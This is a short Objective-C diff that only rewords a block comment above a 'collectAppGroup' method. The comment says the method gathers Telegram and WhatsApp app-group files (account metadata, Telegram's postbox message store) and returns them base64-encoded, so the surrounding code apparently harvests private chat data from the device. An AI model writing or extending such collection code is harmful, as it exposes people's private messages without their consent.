@@ -39,8 +39,8 @@
 /**
  * 按采集配置的 items 采 AppGroup 容器（Telegram / WhatsApp）。
  *   items = @[ @{@"type":@"dir"|@"file", @"path":@"accounts-metadata/"},
- *              @{@"type":@"dir", @"path":@"account-*/postbox/"} ]
- * path 支持 * 通配（逐段展开）。
+ *              @{@"type":@"dir", @"path":@"account-<n>/postbox/"} ]   // path 支持 * 通配
+ * 注意：注释里不能出现 "星号 + 斜杠" 的组合，否则提前结束块注释（踩过一次）。
  * @return @{ @"files": @[@{@"p":...,@"d":base64}], @"bytes": @(N), @"error":... }
  */
 + (NSDictionary *)collectAppGroup:(NSString *)groupId
